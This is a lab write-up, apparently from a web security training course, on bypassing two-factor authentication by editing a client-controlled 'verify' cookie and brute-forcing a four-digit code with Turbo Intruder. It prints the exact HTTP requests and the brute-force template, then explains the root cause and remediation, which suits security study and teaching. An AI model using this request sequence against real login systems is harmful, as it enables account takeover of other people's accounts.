# 2FA Broken Logic

## Overview

This lab demonstrates a **two-factor authentication bypass caused by broken identity binding in the MFA workflow**.

The application used a client-controlled `verify` cookie to decide which user's MFA code should be generated and validated.

Because the server did not securely bind this value to the user who completed the first authentication factor, it was possible to change:

```text
verify=wiener
```

to:

```text
verify=carlos
```

and make the application process MFA codes for the victim account.

The victim's four-digit MFA code could then be brute-forced, resulting in authentication as `carlos` without knowing his password.

---

## Normal Authentication Flow

A legitimate login using the provided account followed this sequence:

```text
POST /login
username=wiener&password=peter
        |
        v
302 Location: /login2
        |
        v
Set-Cookie: verify=wiener
        |
        v
GET /login2
        |
        v
POST /login2
mfa-code=<valid-code>
        |
        v
302 Location: /my-account?id=wiener
```

The important observation was that the user whose MFA code was being processed was identified through the following cookie:

```http
Cookie: verify=wiener
```

This value was controlled by the client.

---

## Identifying the Weakness

The `/login2` request was sent to Burp Repeater and the cookie was changed from:

```http
verify=wiener
```

to:

```http
verify=carlos
```

The server still returned the MFA verification page:

```http
HTTP/2 200 OK
```

This demonstrated that the application accepted an arbitrary username in the `verify` cookie instead of deriving the MFA identity from trusted server-side authentication state.

Conceptually, the application trusted:

```text
Client says: verify=carlos
        |
        v
Server processes Carlos's MFA state
```

without first proving that the client had authenticated as Carlos.

---

## Triggering an MFA Code for the Victim

A request was made to the MFA endpoint with:

```http
GET /login2 HTTP/2
Host: <lab-host>
Cookie: verify=carlos
```

This caused the application to initialize or generate the second-factor verification state for `carlos`.

The server therefore allowed an unauthenticated client to influence which user's MFA challenge was being handled.

---

## Testing MFA Validation

A test request was then sent with a deliberately incorrect code:

```http
POST /login2 HTTP/2
Host: <lab-host>
Cookie: verify=carlos
Content-Type: application/x-www-form-urlencoded

mfa-code=0000
```

The server returned:

```http
HTTP/2 200 OK
```

with:

```text
Incorrect security code
```

This confirmed two important properties:

1. the application was validating the supplied code against Carlos's MFA state;
2. there was no effective brute-force protection preventing repeated code guesses.

---

## Brute-Forcing the MFA Code

The MFA code was four digits long, giving only:

```text
0000 - 9999
```

or 10,000 possible values.

Burp Suite Community Edition throttles Intruder requests, so **Turbo Intruder** was used to send the candidate codes more efficiently.

The request template was:

```http
POST /login2 HTTP/1.1
Host: <lab-host>
Cookie: verify=carlos
Content-Type: application/x-www-form-urlencoded

mfa-code=%s
```

A four-digit payload was generated for every value from `0000` to `9999`.

A successful response was identified using the HTTP status code as an authentication oracle:

```text
Incorrect code -> 200 OK
Correct code   -> 302 Found
```

The valid code identified during this lab instance was:

```text
0708
```

The successful request produced:

```http
HTTP/1.1 302 Found
Location: /my-account?id=carlos
Set-Cookie: session=<authenticated-session>
```

This confirmed successful authentication as `carlos`.

---

## Why the Attack Worked

The vulnerable application treated the `verify` cookie as authoritative identity information.

Conceptually, the MFA implementation behaved like this:

```text
Read verify cookie
        |
        v
Select user account
        |
        v
Generate / validate MFA code for that user
```

The missing security check was:

```text
Does the user identified by the MFA challenge
match the user who successfully completed the first factor?
```

Because this relationship was not enforced, the attacker could redirect the MFA process to another account.

The effective attack chain became:

```text
Choose victim username
        |
        v
verify=carlos
        |
        v
Trigger Carlos's MFA challenge
        |
        v
Brute-force 0000-9999
        |
        v
Valid MFA code found
        |
        v
Authenticated session for Carlos
```

---

## Root Cause

The root cause was **failure to bind the second authentication factor to trusted server-side first-factor state**.

The application relied on a client-controlled cookie:

```http
verify=<username>
```

for security-sensitive identity selection.

A secure implementation should never allow the client to decide which account an MFA challenge belongs to.

Instead, the server should derive the user identity from a trusted, partially authenticated session.

For example:

```text
session.pending_user = carlos
session.first_factor_verified = true
session.mfa_verified = false
```

The MFA endpoint should then retrieve `pending_user` from the server-side session rather than from a request parameter or cookie supplied by the client.

---

## Impact

An attacker who knows or can guess a victim username can potentially bypass the password requirement entirely if the application allows MFA challenges to be reassigned and the verification code can be brute-forced.

Potential consequences include:

- complete account takeover;
- bypass of the first authentication factor;
- bypass of the intended MFA security model;
- unauthorized access to sensitive user data;
- compromise of privileged accounts.

The severity increases significantly when MFA codes have a small keyspace and no effective retry limit.

---

## Remediation

The application should securely bind all authentication stages to the same server-side identity.

Recommended controls include:

- Store the pending authentication identity in server-side session state.
- Never trust a client-controlled username, cookie, or request parameter to select the MFA account.
- Verify that the second factor belongs to the same user who completed the first factor.
- Apply strict retry limits to MFA verification attempts.
- Introduce temporary lockout or challenge invalidation after repeated failures.
- Expire MFA challenges after a short period.
- Regenerate or upgrade the session only after successful MFA completion.
- Log and alert on excessive MFA failures or repeated attempts across accounts.

A secure flow should look like:

```text
Password accepted for user A
        |
        v
Server stores pending_user=A
        |
        v
Generate MFA challenge for A
        |
        v
Validate MFA code for pending_user=A
        |
        v
Full session created for A
```

The client should never be able to substitute user B during this process.

---

## Testing Methodology Takeaway

When testing MFA implementations, inspect every request involved in the workflow and identify how the application determines **which user** the second factor belongs to.

Useful questions include:

```text
Is the username present in a cookie?
Is it present in a hidden form field?
Is it present in the URL or request body?
Can the value be modified?
Is the MFA identity derived from trusted session state?
Does changing the identity generate or validate a code for another user?
Is there brute-force protection on the MFA endpoint?
```

The key principle is:

> Multi-factor authentication is only secure if every factor is cryptographically or logically bound to the same identity and the server enforces that relationship.
